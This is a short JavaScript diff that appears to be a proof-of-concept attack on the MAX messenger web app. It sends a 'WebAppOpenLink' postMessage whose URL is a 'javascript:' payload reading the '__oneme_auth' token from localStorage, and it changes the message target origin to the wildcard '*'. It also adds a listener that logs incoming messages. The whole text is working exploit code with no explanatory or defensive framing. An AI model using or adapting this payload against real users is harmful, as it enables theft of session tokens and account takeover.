@@ -5,7 +5,7 @@ window.parent.postMessage(
       "type": "WebAppOpenLink",
       "url": "javascript:alert(localStorage.getItem('__oneme_auth'))"
   }),
-  "https://web.max.ru"
+  "*"
 );
 window.addEventListener("message", (event) => {
   console.log("Полученные данные:", event.data);
